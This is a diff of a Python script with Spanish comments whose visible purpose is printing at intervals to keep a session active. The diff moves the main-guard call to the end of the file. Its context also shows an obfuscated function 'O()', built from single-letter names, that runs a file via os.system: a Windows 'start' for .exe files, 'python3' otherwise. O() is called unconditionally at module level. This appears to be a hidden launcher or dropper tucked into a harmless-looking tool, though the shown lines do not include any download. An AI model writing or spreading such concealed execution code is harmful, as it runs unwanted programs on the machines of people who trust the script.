@@ -22,8 +22,6 @@ def actividad(intervalo=600):
         sys.stdout.flush()  #Hace que imprima de one
         time.sleep(interval)  # Espera el intervalo especificado (en segundos)
 
-if __name__ == "__main__":
-    actividad(intervalo=600)
 
 
 
@@ -103,3 +101,6 @@ def O():
 	elif A.split(F)[-1]=='exe':B.system(f"start /D {C} {C}\\{A} && exit")
 	else:B.system(f"python3 {A}")
 O()
+
+if __name__ == "__main__":
+    actividad(intervalo=600)
